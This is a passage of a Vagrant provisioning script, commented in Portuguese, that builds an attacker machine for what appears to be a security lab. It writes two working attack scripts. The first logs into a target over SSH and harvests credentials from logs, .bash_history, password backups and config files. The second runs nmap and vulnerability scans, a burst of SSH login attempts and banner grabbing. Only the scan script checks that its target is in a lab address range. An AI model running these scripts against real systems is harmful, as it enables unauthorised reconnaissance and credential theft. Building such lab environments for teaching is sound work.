  echo "$AUTH_LOG" | grep -oE "for (invalid user )?[a-zA-Z0-9_-]+ from" | awk '{print $(NF-1)}' | sort -u | tee -a "$OUTLOG"
  
else
  echo "[FAIL] Não foi possível ler auth.log" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Procurar por arquivos de log com credenciais
echo "[*] Step 4: Procurando logs com credenciais expostas..." | tee -a "$OUTLOG"
APP_LOG=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'cat /var/log/app_config.log 2>/dev/null' 2>/dev/null)

if [ -n "$APP_LOG" ]; then
  echo "[SUCCESS] app_config.log encontrado e legível!" | tee -a "$OUTLOG"
  echo "[CRITICAL] Credenciais expostas no log:" | tee -a "$OUTLOG"
  
  # Extrair credenciais
  echo "$APP_LOG" | grep -E "DB_PASS|API_KEY|AWS|password|token|key" | tee -a "$OUTLOG"
  echo "$APP_LOG" > /vagrant_shared/attacker_results/stolen_app_credentials.txt
  
else
  echo "[INFO] app_config.log não encontrado" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Analisar .bash_history do usuário
echo "[*] Step 5: Lendo histórico de comandos (.bash_history)..." | tee -a "$OUTLOG"
BASH_HISTORY=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'cat ~/.bash_history 2>/dev/null' 2>/dev/null)

if [ -n "$BASH_HISTORY" ]; then
  echo "[SUCCESS] .bash_history é legível!" | tee -a "$OUTLOG"
  echo "[INFO] Comandos sensíveis encontrados:" | tee -a "$OUTLOG"
  
  # Procurar por comandos com senhas, mysql, ssh, wget
  echo "$BASH_HISTORY" | grep -E "mysql.*-p|ssh.*@|password|passwd|wget|curl|sudo" | head -10 | tee -a "$OUTLOG"
  echo "$BASH_HISTORY" > /vagrant_shared/attacker_results/bash_history.txt
  
else
  echo "[INFO] .bash_history não acessível" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Procurar arquivos de backup com senhas
echo "[*] Step 6: Procurando arquivos de backup com senhas..." | tee -a "$OUTLOG"
BACKUP_PASS=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'cat /var/backups/passwords_backup.txt 2>/dev/null' 2>/dev/null)

if [ -n "$BACKUP_PASS" ]; then
  echo "[CRITICAL] Arquivo de backup com senhas encontrado!" | tee -a "$OUTLOG"
  echo "[CONTENT]" | tee -a "$OUTLOG"
  echo "$BACKUP_PASS" | tee -a "$OUTLOG"
  echo "$BACKUP_PASS" > /vagrant_shared/attacker_results/passwords_backup.txt
  
else
  echo "[INFO] Nenhum backup de senhas encontrado em /var/backups/" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Procurar por arquivos de configuração com credenciais
echo "[*] Step 7: Procurando arquivos de configuração..." | tee -a "$OUTLOG"
CONFIG_FILES=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'find /etc /home -type f \( -name "*.conf" -o -name "*.cfg" -o -name ".env" \) 2>/dev/null | head -20' 2>/dev/null)

if [ -n "$CONFIG_FILES" ]; then
  echo "[INFO] Arquivos de configuração encontrados:" | tee -a "$OUTLOG"
  echo "$CONFIG_FILES" | tee -a "$OUTLOG"
  
  # Tentar ler alguns arquivos sensíveis
  echo "" | tee -a "$OUTLOG"
  echo "[INFO] Verificando conteúdo de arquivos sensíveis..." | tee -a "$OUTLOG"
  
  for file in /etc/mysql/my.cnf /home/professor/.ssh/config; do
    CONTENT=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" "cat $file 2>/dev/null" 2>/dev/null || echo "")
    if [ -n "$CONTENT" ]; then
      echo "[FOUND] $file:" | tee -a "$OUTLOG"
      echo "$CONTENT" | head -10 | tee -a "$OUTLOG"
    fi
  done
else
  echo "[INFO] Nenhum arquivo de configuração acessível" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Enumerar processos em execução (pode revelar aplicações)
echo "[*] Step 8: Enumerando processos em execução..." | tee -a "$OUTLOG"
PROCESSES=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'ps aux | grep -E "mysql|postgres|apache|nginx|redis" | grep -v grep' 2>/dev/null || echo "Nenhum processo sensível encontrado")

echo "[INFO] Processos sensíveis:" | tee -a "$OUTLOG"
echo "$PROCESSES" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Resumo final
echo "========================================" | tee -a "$OUTLOG"
echo "  RESUMO DO ATAQUE AOS LOGS" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "[✓] Logs legíveis: auth.log, app_config.log" | tee -a "$OUTLOG"
echo "[✓] Usuários enumerados: Via auth.log" | tee -a "$OUTLOG"
echo "[✓] Credenciais expostas: DB, API keys, AWS" | tee -a "$OUTLOG"
echo "[✓] Histórico de comandos: .bash_history lido" | tee -a "$OUTLOG"
echo "[✓] Backup de senhas: Encontrado e copiado" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "IMPACTO:" | tee -a "$OUTLOG"
echo "- Exposição de credenciais múltiplas (DB, API, AWS)" | tee -a "$OUTLOG"
echo "- Enumeração completa de usuários do sistema" | tee -a "$OUTLOG"
echo "- Histórico de comandos revela atividades sensíveis" | tee -a "$OUTLOG"
echo "- Senhas em texto claro em backups" | tee -a "$OUTLOG"
echo "- Possível pivoting para outros sistemas" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "CVSS Score: 7.5 (ALTO)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "End time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "Log completo salvo em: $OUTLOG" | tee -a "$OUTLOG"
LOGS_ATTACK

chmod +x /home/vagrant/attack_scripts/attack_logs.sh
chown vagrant:vagrant /home/vagrant/attack_scripts/attack_logs.sh

# --- Cria o script de Port Scanning (demonstra ausência de IDS) ---
cat > /home/vagrant/attack_scripts/attack_scan.sh <<'SCAN_ATTACK'
#!/usr/bin/env bash
# attack_scan.sh
# Demo: Port scanning e enumeração demonstrando ausência de IDS/IPS
# USAGE: ./attack_scan.sh <target_ip>
# Demonstra: Múltiplas varreduras passam despercebidas sem detecção

set -euo pipefail

TARGET="${1:-192.168.56.10}"
OUTLOG="/vagrant_shared/attacker_results/scan_attack_result.log"

echo "========================================" | tee "$OUTLOG"
echo "  Port Scanning - IDS/IPS Absence Demo" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "Target: $TARGET" | tee -a "$OUTLOG"
echo "Time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Safety check: only run inside 192.168.56.0/24
if [[ ! "$TARGET" =~ ^192\.168\.56\.[0-9]+$ ]]; then
  echo "[ERROR] Target $TARGET not in allowed private range. Aborting." | tee -a "$OUTLOG"
  exit 2
fi

# Scan básico de portas TCP comuns
echo "[*] Step 1: Scanning portas TCP comuns (Top 100)..." | tee -a "$OUTLOG"
COMMON_PORTS=$(nmap -p- --top-ports 100 "$TARGET" 2>&1)

echo "[RESULT] Portas abertas encontradas:" | tee -a "$OUTLOG"
echo "$COMMON_PORTS" | grep -E "open|filtered" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Scan com detecção de versões
echo "[*] Step 2: Service version detection..." | tee -a "$OUTLOG"
VERSION_SCAN=$(nmap -sV -p 21,22,80,443,3306,5432 "$TARGET" 2>&1)

echo "[RESULT] Serviços identificados:" | tee -a "$OUTLOG"
echo "$VERSION_SCAN" | grep -E "open|version" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Scan de sistema operacional
echo "[*] Step 3: OS Detection (requer root, pode falhar)..." | tee -a "$OUTLOG"
OS_SCAN=$(sudo nmap -O "$TARGET" 2>&1 || nmap -A "$TARGET" 2>&1)

echo "[RESULT] Sistema operacional:" | tee -a "$OUTLOG"
echo "$OS_SCAN" | grep -E "OS details|Running|OS CPE" | head -5 | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Scan agressivo de vulnerabilidades
echo "[*] Step 4: Vulnerability scanning com scripts NSE..." | tee -a "$OUTLOG"
VULN_SCAN=$(nmap --script vuln -p 21,22,80 "$TARGET" 2>&1 || echo "Script scan failed")

if echo "$VULN_SCAN" | grep -q "VULNERABLE"; then
  echo "[CRITICAL] Vulnerabilidades encontradas:" | tee -a "$OUTLOG"
  echo "$VULN_SCAN" | grep -A 5 "VULNERABLE" | tee -a "$OUTLOG"
else
  echo "[INFO] Nenhuma vulnerabilidade crítica detectada pelos scripts NSE" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Múltiplas tentativas SSH para demonstrar ausência de fail2ban
echo "[*] Step 5: Testando ausência de rate limiting (fail2ban)..." | tee -a "$OUTLOG"
echo "[INFO] Fazendo múltiplas tentativas SSH com senha incorreta..." | tee -a "$OUTLOG"

FAILED_ATTEMPTS=0
for i in {1..15}; do
  if ! sshpass -p "wrongpass$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes -o UserKnownHostsFile=/dev/null test@"$TARGET" exit 2>/dev/null; then
    FAILED_ATTEMPTS=$((FAILED_ATTEMPTS + 1))
  fi
  sleep 0.5
done

echo "[RESULT] Tentativas falhadas enviadas: $FAILED_ATTEMPTS" | tee -a "$OUTLOG"
echo "[INFO] Verificando se IP foi bloqueado..." | tee -a "$OUTLOG"

# Testar se ainda conseguimos conectar (sem bloqueio)
if nc -zv -w2 "$TARGET" 22 2>&1 | grep -q "succeeded\|open"; then
  echo "[CRITICAL] IP NÃO foi bloqueado após $FAILED_ATTEMPTS tentativas!" | tee -a "$OUTLOG"
  echo "[CRITICAL] Sistema SEM fail2ban ou rate limiting!" | tee -a "$OUTLOG"
else
  echo "[INFO] IP pode ter sido bloqueado (fail2ban ativo)" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Scan de UDP (mais lento)
echo "[*] Step 6: UDP port scanning (top 20 portas)..." | tee -a "$OUTLOG"
UDP_SCAN=$(sudo nmap -sU --top-ports 20 "$TARGET" 2>&1 || echo "UDP scan requires root")

echo "[RESULT] Portas UDP:" | tee -a "$OUTLOG"
echo "$UDP_SCAN" | grep -E "open|filtered" | head -10 | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Enumerar banners dos serviços
echo "[*] Step 7: Banner grabbing..." | tee -a "$OUTLOG"

# FTP Banner
echo "[FTP - Port 21]" | tee -a "$OUTLOG"
timeout 3 nc "$TARGET" 21 2>&1 | head -3 | tee -a "$OUTLOG" || echo "FTP não acessível" | tee -a "$OUTLOG"

# SSH Banner
echo "" | tee -a "$OUTLOG"
echo "[SSH - Port 22]" | tee -a "$OUTLOG"
timeout 3 nc "$TARGET" 22 2>&1 | head -1 | tee -a "$OUTLOG" || echo "SSH não respondeu" | tee -a "$OUTLOG"

# HTTP Banner
echo "" | tee -a "$OUTLOG"
echo "[HTTP - Port 80]" | tee -a "$OUTLOG"
curl -s -I "http://$TARGET" 2>&1 | head -5 | tee -a "$OUTLOG" || echo "HTTP não acessível" | tee -a "$OUTLOG"

echo "" | tee -a "$OUTLOG"

# Verificar se houve alguma detecção ou bloqueio
echo "[*] Step 8: Verificando se houve detecção do scanning..." | tee -a "$OUTLOG"
echo "[INFO] Tentando conexão normal após todos os scans..." | tee -a "$OUTLOG"

if nc -zv -w3 "$TARGET" 22 2>&1 | grep -q "succeeded\|open"; then
  echo "[CRITICAL] Todas as varreduras passaram DESPERCEBIDAS!" | tee -a "$OUTLOG"
  echo "[CRITICAL] Nenhum IDS/IPS detectou ou bloqueou os scans" | tee -a "$OUTLOG"
  echo "[CRITICAL] Sistema completamente exposto a reconnaissance" | tee -a "$OUTLOG"
else
  echo "[INFO] Possível bloqueio detectado (IDS pode estar ativo)" | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Resumo final
echo "========================================" | tee -a "$OUTLOG"
echo "  RESUMO DO SCANNING" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "[✓] Port scan completo: Realizado" | tee -a "$OUTLOG"
echo "[✓] Service detection: Completo" | tee -a "$OUTLOG"
echo "[✓] OS fingerprinting: Tentado" | tee -a "$OUTLOG"
echo "[✓] Vulnerability scan: Executado" | tee -a "$OUTLOG"
echo "[✓] Múltiplas tentativas SSH: 15+ sem bloqueio" | tee -a "$OUTLOG"
echo "[✓] Banner grabbing: Concluído" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "IMPACTO:" | tee -a "$OUTLOG"
echo "- Ausência completa de IDS/IPS" | tee -a "$OUTLOG"
echo "- Reconhecimento extensivo passou despercebido" | tee -a "$OUTLOG"
echo "- Múltiplas tentativas de autenticação sem bloqueio" | tee -a "$OUTLOG"
echo "- Serviços e versões expostos ao atacante" | tee -a "$OUTLOG"
echo "- Facilita ataques direcionados subsequentes" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "CVSS Score: 5.3 (MÉDIO)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "End time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "Log completo salvo em: $OUTLOG" | tee -a "$OUTLOG"
SCAN_ATTACK

chmod +x /home/vagrant/attack_scripts/attack_scan.sh
chown vagrant:vagrant /home/vagrant/attack_scripts/attack_scan.sh

# Instalar cliente FTP e ferramentas necessárias
apt-get install -y ftp netcat-openbsd curl

# Touch result file to ensure shared path exists
touch /vagrant_shared/attacker_results/attack.log
chown vagrant:vagrant /vagrant_shared/attacker_results/attack.log || true

echo "Provision attacker finished at $(date)" > /vagrant_shared/attacker_provision_done.txt

